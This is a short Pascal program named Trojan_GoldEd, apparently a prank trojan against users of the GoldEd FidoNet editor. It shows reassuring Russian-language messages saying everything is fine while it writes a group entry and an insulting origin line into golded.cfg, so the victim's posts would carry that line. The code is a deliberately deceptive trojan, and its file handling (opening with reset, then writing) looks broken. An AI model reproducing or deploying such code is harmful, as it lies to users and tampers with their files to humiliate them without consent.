program Trojan_GoldEd;
uses crt;
var x:text;
begin
textcolor(3);
writeln('Все в порядке, теперь можешь смело заходить обратно '+
                                                     'в голдед');
writeln('и попробовать написать чего-нить в эху 308.SLOPS...');
writeln('Результат появится где-нить через парочку дней.');
assign(x,'golded.cfg');reset(x);
writeln(x,'');
writeln(x,'group !689.FLAME');
writeln(x,'member 689.FLAME');
writeln(x,'origin Я какашка, я скотина, я мудозвон! ');
writeln(x,'ENDGROUP');
close(x);
end.
